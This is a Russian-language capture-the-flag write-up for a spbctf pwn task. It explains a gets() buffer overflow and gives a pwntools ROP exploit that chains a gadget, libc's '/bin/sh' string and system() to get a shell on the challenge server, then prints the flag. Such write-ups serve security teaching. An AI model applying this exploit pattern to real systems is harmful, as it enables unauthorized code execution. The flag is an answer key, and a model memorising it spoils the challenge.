[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_popa_ot_ropa)
В программе не хватает функционала. А добавьте свой в виде RCE!
`nc 109.233.56.90 11673`
**[popa_ot_ropa.elf](https://pwn.spbctf.ru/files/aslr/popa_ot_ropa/popa_ot_ropa.elf)**  
**[libc-2.31.so](https://pwn.spbctf.ru/files/aslr/popa_ot_ropa/libc-2.31.so)**

Имеется уязвимость переполнения буфера, можно создать ROP-цепочку.
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-40h] BYREF

  show_memory(argc, argv, envp);
  puts("I have no useful functionality. Better add your own!");
  gets(v4);
  return 0;
}
```
Причём ASLR отключён и программа предоставляет все адреса памяти.

Также имеется гаджет для `pop rdi`.
```
.text:00000000004011B3 g_pop_rax       proc near
.text:00000000004011B3 ; __unwind {
.text:00000000004011B3                 pop     rax
.text:00000000004011B4                 mov     rdi, rax
.text:00000000004011B7                 retn
.text:00000000004011B7 g_pop_rax       endp ; sp-analysis failed
```

Заполнение буфера:
1. Буфер
2. `pop rdi` addr
3. `bin/sh` addr
4. `system` addr
К задаче прикреплена версия `libc`, там можно найти строку `bin/sh`, а адрес функции `system` находится внутри самой программы.

Эксплоит:
``` python
pop_rdi = 0x4011B3
bin_sh = 0x7ffff7de3000 + 0x18A156
sysyem = 0x401040

io = start()

payload = b'A' * 72
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(sysyem)

io.sendline(payload)

io.interactive()
```

Запуск:
![{CF611CBA-8C34-46CB-8BB3-FB7F68F82CAE}](../../../../z.%20Images/{CF611CBA-8C34-46CB-8BB3-FB7F68F82CAE}.png)

Ответ: `spbctf{370_3ch0_n3_p0p4_v07_5k0r0_bud37_zh0p4}`